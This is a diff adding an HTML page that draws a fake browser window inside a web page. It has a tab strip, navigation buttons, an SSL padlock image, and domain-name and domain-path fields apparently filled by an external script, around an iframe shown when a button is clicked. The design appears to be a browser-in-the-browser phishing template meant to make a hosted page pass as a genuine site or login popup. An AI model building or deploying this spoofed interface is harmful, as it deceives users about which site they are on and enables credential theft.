@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<script src="/config.js"></script>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+<button id="show-iframe-btn" type="button">Mostrar iframe</button>
+<div id="window" class="is-hidden">
+	<div id="browser-chrome">
+		<div id="title-bar" class="tab-row">
+			<div class="dots" aria-hidden="true">
+				<div id="exit" class="dot red"></div>
+				<div id="minimize" class="dot amber"></div>
+				<div id="maximize" class="dot green"></div>
+			</div>
+
+			<div class="tab-strip" aria-hidden="true">
+				<div class="active-tab">
+					<img src="./google.svg" class="tab-favicon" width="14" height="14" alt="">
+					<span class="tab-title" id="tab-title">New Tab</span>
+					<svg class="chrome-svg tab-close" viewBox="0 0 24 24">
+						<path d="M7 7l10 10M17 7L7 17"></path>
+					</svg>
+				</div>
+				<button class="icon-button new-tab" type="button" aria-label="Nueva pestana">
+					<svg class="chrome-svg" viewBox="0 0 24 24">
+						<path d="M12 5v14M5 12h14"></path>
+					</svg>
+				</button>
+			</div>
+			<span id="logo-description"></span>
+		</div>
+
+		<div id="nav-bar" class="nav-row">
+			<div class="nav-actions" aria-hidden="true">
+				<button class="icon-button" type="button" aria-label="Atras">
+					<svg class="chrome-svg" viewBox="0 0 24 24"><path d="M14.5 6.5L9 12l5.5 5.5"></path></svg>
+				</button>
+				<button class="icon-button" type="button" aria-label="Adelante">
+					<svg class="chrome-svg" viewBox="0 0 24 24"><path d="M9.5 6.5L15 12l-5.5 5.5"></path></svg>
+				</button>
+				<button class="icon-button reload-btn" type="button" aria-label="Recargar">
+					<svg class="chrome-svg reload-icon" viewBox="0 0 24 24"><path d="M20 11a8 8 0 1 0-2.34 5.66"></path><path d="M20 2v6h-6"></path></svg>
+				</button>
+			</div>
+
+			<div id="url-bar" class="omnibox">
+				<svg class="chrome-svg search-icon" viewBox="0 0 24 24" aria-hidden="true">
+					<circle cx="11" cy="11" r="6"></circle>
+					<path d="M16 16l4 4"></path>
+				</svg>
+				<img src="./ssl.svg" width="1" height="1" id="ssl-padlock" alt="">
+				<span id="domain-name"></span><span id="domain-path"></span>
+				<svg class="chrome-svg star-icon" viewBox="0 0 24 24" aria-hidden="true">
+					<path d="M12 3.6l2.6 5.3 5.8.8-4.2 4.1 1 5.8-5.2-2.7-5.2 2.7 1-5.8-4.2-4.1 5.8-.8z"></path>
+				</svg>
+			</div>
+
+			<div class="right-actions" aria-hidden="true">
+				<span class="divider"></span>
+				<svg class="chrome-svg profile-icon" viewBox="0 0 24 24" aria-hidden="true"><circle class="profile-disc" cx="12" cy="12" r="10"></circle><circle class="profile-head" cx="12" cy="9" r="3"></circle><path class="profile-body" d="M6.8 18.2c.9-3 2.8-4.5 5.2-4.5s4.3 1.5 5.2 4.5"></path></svg>
+				<svg class="chrome-svg menu-icon" viewBox="0 0 24 24"><circle cx="12" cy="5" r="1.45"></circle><circle cx="12" cy="12" r="1.45"></circle><circle cx="12" cy="19" r="1.45"></circle></svg>
+			</div>
+		</div>
+	</div>
+	<iframe id="content" class="is-hidden" frameBorder="0"></iframe>
+</div>
+</body>
+<script src="/script.js"></script>
+</html>
